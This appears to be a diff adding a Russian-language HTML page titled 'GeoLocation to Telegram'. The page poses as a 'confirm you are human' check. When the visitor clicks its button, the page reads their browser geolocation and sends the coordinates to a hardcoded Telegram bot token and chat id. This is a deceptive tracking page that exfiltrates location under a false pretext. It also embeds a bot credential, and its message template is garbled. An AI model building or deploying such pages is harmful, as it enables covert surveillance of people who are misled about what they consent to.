@@ -1,0 +1,74 @@
+`html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>GeoLocation to Telegram</title>
+</head>
+<body>
+  <h2>Подтвердите что вы человек</h2>
+  <button onclick="getLocation()"> Отправить что я не человек</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+      } else {
+        alert("Геолокация не поддерживается вашим браузером.");
+      }
+    }
+
+    function sendToTelegram(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      const token = "7414759391:AAHQ_n9ELvC9DG6I7iaXxS0A78LajMTOlfc";
+      const chat_id = "7521102948";
+      const message = `🌍 Новая геолокация:\nШирота: latitude:{longitude}`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Координаты отправлены!");
+        } else {
+          alert("Ошибка при отправке в Telegram.");
+        }
+      })
+      .catch(error => {
+        console.error("Ошибка:", error);
+        alert("Не удалось отправить координаты.");
+      });
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          alert("Пользователь отклонил запрос геолокации.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("Информация о местоположении недоступна.");
+          break;
+        case error.TIMEOUT:
+          alert("Время ожидания запроса геолокации истекло.");
+          break;
+        case error.UNKNOWN_ERROR:
+          alert("Произошла неизвестная ошибка.");
+          break;
+      }
+    }
+  </script>
+</body>
+</html>
+`
